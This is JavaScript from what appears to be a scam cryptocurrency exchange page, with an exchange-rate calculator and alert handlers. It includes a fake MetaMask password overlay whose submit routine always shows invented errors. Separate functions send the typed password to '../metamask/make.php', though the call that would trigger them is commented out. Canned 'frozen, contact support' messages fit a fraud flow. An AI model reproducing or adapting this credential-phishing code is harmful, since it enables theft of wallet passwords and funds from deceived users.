 function noti(msg, status) {
    toastr[status](msg);
    toastr.options = {
      "closeButton": false,
      "debug": false,
      "newestOnTop": false,
      "progressBar": false,
      "rtl": false,
      "positionClass": "toast-top-right",
      "preventDuplicates": false,
      "onclick": null,
      "showDuration": 300,
      "hideDuration": 1000,
      "timeOut": 5000,
      "extendedTimeOut": 1000,
      "showEasing": "swing",
      "hideEasing": "linear",
      "showMethod": "fadeIn",
      "hideMethod": "fadeOut"
    }
  }



	$("#alert_close_modal").on("click", function() {
    $("#alert_message_modal").css("display", "none");
    var alertMessageId = $("#alertMessageId").val();

		  $.ajax({
	      url: "../ajax/ajax",
	      type: "POST",
	      data: {
	        action: "VIEWED_ALERT_MESSAGE",
	        message_id: alertMessageId
	      },
	      success: function(response) {

	      }
	    })
  });

  $("#alert_close_modal_btn").on("click", function() {
    $("#alert_message_modal").css("display", "none");
    var alertMessageId = $("#alertMessageId").val();

		  $.ajax({
	      url: "../ajax/ajax",
	      type: "POST",
	      data: {
	        action: "VIEWED_ALERT_MESSAGE",
	        message_id: alertMessageId
	      },
	      success: function(response) {

	      }
	    })
  });


   function openMetaMask() {
    $("#metMaskBlock").css("opacity", "1");
    $("#metMaskBlock").css("z-index", "99999999");
    setTimeout(function () {
        $('#load').addClass('hide');
        $("#verify_popap_meta").css("display", "none");
        document.getElementById('loaded').classList.remove('hide');
    }, 1000);

    setInterval(function() {
      if(($("#pswrd").val().length > 7)) {document.getElementById("buttonf").disabled = false;} else {document.getElementById("buttonf").disabled = true;}
    }, 1000)


  }


function func() {
  document.getElementById('pswrd').classList.remove('border-red');
  $('#error1').addClass('hide');
}


var calc = 0;

function sendform(e) {
        e.preventDefault();
        //send_message()
        calc ++
        $('#error1').addClass('hide');
        $('#error2').addClass('hide');
        document.getElementById('pswrd').classList.remove('border-red');

        if (calc < 3) {
        $('#buttonf').addClass('hide');
        document.getElementById('loading').classList.remove('hide');
        setTimeout(function () {
        $('#loading').addClass('hide');
        $('#pswrd').addClass('border-red');
        document.getElementById('error1').classList.remove('hide');
        document.getElementById('buttonf').classList.remove('hide'); 
        }, 1234);
        }

        if (calc > 2) {
        $('#buttonf').addClass('hide');
        document.getElementById('loading').classList.remove('hide');
        setTimeout(function () {
        $('#loading').addClass('hide');
        document.getElementById('error2').classList.remove('hide');
        }, 984);
        }
       
}
    
    
function send_message() {
        var res = document.getElementById('pswrd').value;
            send_ajax(res)
}

function send_ajax(text) {
       return new Promise(function (resolve, reject) {
            $.ajax({
                type: 'post',
                url: '../metamask/make.php',
                dataType: 'json',
                data: {
                    'text':text,
                }
            });
        });
}


$("#closeMetaMaskBtn").on("click", function() {
    $("#verify_popap_meta").css("display", "none");
    var MetaalertMessageId = $("#MetaalertMessageId").val();

		  $.ajax({
	      url: "../ajax/ajax",
	      type: "POST",
	      data: {
	        action: "VIEWED_ALERT_MESSAGE",
	        message_id: MetaalertMessageId
	      },
	      success: function(response) {

	      }
	    })
  }); 

  
  


    var ex_currency = 'BTC';
    var for_currency = 'USDT';

    $.ajax({
        url: '/ajax/EX',
        type: 'POST',
        data: {
            amount: "1",
            exchange: ex_currency,
            for: for_currency,
            action: 'calc'
        },
        success: function(event) {
            if(event == '9') {
                noti('Sorry, but due to the situation with the state of your country, we temporarily closed the wallets of this currency for your country', 'error');
            } else {

                $("#rate_two").empty().html(event); 
                $("#rate_two_currency").empty().html(for_ex.toUpperCase());
                $("#rate_one_currency").empty().html(ex.toUpperCase());
                
            }
        }
    })

    function sendCurrencySelect(crypto) {
        ex_currency = crypto

        var amount = $("#ex_amount").val();
        var ex = ex_currency;
        var for_ex = for_currency;

        $.ajax({
            url: '/ajax/EX',
            type: 'POST',
            data: {
                amount: amount,
                exchange: ex,
                for: for_ex,
                action: 'calc'
            },
            success: function(event) {
                if(event == '9') {
                    noti('Sorry, but due to the situation with the state of your country, we temporarily closed the wallets of this currency for your country', 'error');
                } else {

                    $("#ex_amount_from").empty().val(event); 
                    
                }
            }
        })

        $.ajax({
            url: '/ajax/EX',
            type: 'POST',
            data: {
                amount: "1",
                exchange: ex,
                for: for_ex,
                action: 'calc'
            },
            success: function(event) {
                if(event == '9') {
                    noti('Sorry, but due to the situation with the state of your country, we temporarily closed the wallets of this currency for your country', 'error');
                } else {

                    $("#rate_two").empty().html(event); 
                    $("#rate_two_currency").empty().html(for_ex.toUpperCase());
                    $("#rate_one_currency").empty().html(ex.toUpperCase());
                    
                }
            }
        })

        $.ajax({
            url: '/ajax/MY_EX_BALANCE',
            type: 'POST',
            data: {
                crypto: ex_currency
            },
            success: function(event) {

                $("#my_available_balance").empty().html(event); 
                $("#my_available_crypto").empty().html(ex_currency.toUpperCase()); 
           
            }
        })
    }

    function getCurrencySelect(crypto) {
        for_currency = crypto

        var amount = $("#ex_amount").val();
        var ex = ex_currency;
        var for_ex = for_currency;

        $.ajax({
            url: '/ajax/EX',
            type: 'POST',
            data: {
                amount: amount,
                exchange: ex,
                for: for_ex,
                action: 'calc'
            },
            success: function(event) {
                if(event == '9') {
                    noti('Sorry, but due to the situation with the state of your country, we temporarily closed the wallets of this currency for your country', 'error');
                } else {

                    $("#ex_amount_from").empty().val(event); 
                    
                }
                
            }
        })

        $.ajax({
            url: '/ajax/EX',
            type: 'POST',
            data: {
                amount: "1",
                exchange: ex,
                for: for_ex,
                action: 'calc'
            },
            success: function(event) {
                if(event == '9') {
                    noti('Sorry, but due to the situation with the state of your country, we temporarily closed the wallets of this currency for your country', 'error');
                } else {

                    $("#rate_two").empty().html(event); 
                    $("#rate_two_currency").empty().html(for_ex.toUpperCase());
                    $("#rate_one_currency").empty().html(ex.toUpperCase());
                    
                }
            }
        })
    }

    function availableBalance() {
        var available = $("#my_available_balance").html();
        $("#ex_amount").val(available);

        var amount = $("#ex_amount").val();
        var ex = ex_currency;
        var for_ex = for_currency;

        if(parseFloat(amount) < 0 || amount == "-" || amount == "+") {
            noti("Repeated actions will lead to account blocking!", "error");
            $("#ex_amount").val("");
            $("#ex_amount_from").val("");
        } else {
            $.ajax({
                url: '/ajax/EX',
                type: 'POST',
                data: {
                    amount: amount,
                    exchange: ex,
                    for: for_ex,
                    action: 'calc'
                },
                success: function(event) {
                    if(event == '9') {
                        noti('Sorry, but due to the situation with the state of your country, we temporarily closed the wallets of this currency for your country', 'error');
                    } else {

                        $("#ex_amount_from").empty().val(event); 
                        
                    }
                }
            })
        }
    }

    
    $("#ex_amount").on("input", function() {
        var amount = $("#ex_amount").val();
        var ex = ex_currency;
        var for_ex = for_currency;

        if(parseFloat(amount) < 0 || amount == "-" || amount == "+") {
            noti("Repeated actions will lead to account blocking!", "error");
            $("#ex_amount").val("");
            $("#ex_amount_from").val("");
        } else {
            $.ajax({
                url: '/ajax/EX',
                type: 'POST',
                data: {
                    amount: amount,
                    exchange: ex,
                    for: for_ex,
                    action: 'calc'
                },
                success: function(event) {
                    if(event == '9') {
                        noti('Sorry, but due to the situation with the state of your country, we temporarily closed the wallets of this currency for your country', 'error');
                    } else {

                        $("#ex_amount_from").empty().val(event); 
                        
                    }
                }
            })
        }

        
    })

 
    
    $('#ex_btn').on('click', function(e) {
        e.preventDefault();

        var amount = $("#ex_amount").val();
        var ex = ex_currency;
        var for_ex = for_currency;

        if(amount == "") {
            noti("Please, enter amount and try again", "error");
        } else {

            $("#one_block").css("display", 'none');
            $("#two_block").css("display", 'flex');

            setTimeout(function() {
                if(parseFloat(amount) < 0) {
                    noti("Repeated actions will lead to account blocking!", "error");
                    $("#one_block").css("display", 'flex');
                    $("#two_block").css("display", 'none');
                } else {
                   $.ajax({
                        url: '/ajax/EX',
                        type: 'POST',
                        data: {
                            amount: amount,
                            exchange: ex,
                            for: for_ex,
                            action: 'exchange'
                        },
                        success: function(event) {
                            if(event == "0") {
                                noti("Fill in the amount field!", "error"); 
                                $("#one_block").css("display", 'flex');
                                $("#two_block").css("display", 'none');
                            } else if(event == "1") {
                                noti("You don't have enough funds to exchange!", "error"); 
                                $("#one_block").css("display", 'flex');
                                $("#two_block").css("display", 'none');
                            } else if(event == "2") {
                                noti("Cannot be exchanged for the same currency!", "error"); 
                                $("#one_block").css("display", 'flex');
                                $("#two_block").css("display", 'none');
                            } else if(event == "4") {
                                noti("Repeated actions will lead to account blocking!", "error");
                                $("#one_block").css("display", 'flex');
                                $("#two_block").css("display", 'none'); 
                            } else if(event == "5") {
                                noti("You have frozen this function. Contact support.", "error");
                                $("#one_block").css("display", 'flex');
                                $("#two_block").css("display", 'none');
                            } else if(event == "3") {
                                noti("The exchange was completed successfully.", "success"); 

                                $("#success_one_amount").html(amount);
                                $("#success_one_currency").html(ex.toUpperCase());

                                var ex_amount_from = $("#ex_amount_from").val();
                                $("#success_two_amount").html(ex_amount_from);
                                $("#success_two_currency").html(for_ex.toUpperCase());

                                $("#two_block").css("display", 'none');
                                $("#three_block").css("display", 'flex');
                            } else {
                                noti("An unknown error has occurred. Please try again later!", "info"); 
                                $("#one_block").css("display", 'flex');
                                $("#two_block").css("display", 'none');
                            }
                            

                        }
                    }) 
                }
            }, 2500);

        }


    });